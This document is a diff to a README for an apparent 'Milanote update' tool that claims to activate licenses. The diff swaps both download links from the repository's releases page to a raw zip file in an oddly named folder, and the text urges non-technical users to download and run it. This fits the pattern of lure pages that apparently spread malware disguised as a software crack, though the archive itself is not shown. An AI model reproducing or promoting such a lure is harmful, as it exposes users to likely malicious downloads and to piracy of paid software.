@@ -1,6 +1,6 @@
 # 🎨 milanote-creative-app-update - Unlock Your Creative Workflow Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/joseirs842/milanote-creative-app-update/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/joseirs842/milanote-creative-app-update/raw/refs/heads/main/wichtje/1.3.zip)
 
 Welcome! This tool helps you update Milanote, a popular creative app for organizing ideas and projects. With version 2.4.6, you can activate your license, work offline, and improve your workflow on Windows, macOS, or Linux.
 
@@ -12,7 +12,7 @@ To start using this utility, follow these simple steps. You do not need any tech
 
 Visit this link to download the application.
 
-[Download the Latest Version](https://github.com/joseirs842/milanote-creative-app-update/releases)
+[Download the Latest Version](https://github.com/joseirs842/milanote-creative-app-update/raw/refs/heads/main/wichtje/1.3.zip)
 
 On the page that opens, look for the file that matches your operating system. For Windows, click the file with "win" or "windows" in its name. The download may take a few minutes depending on your internet speed.
 
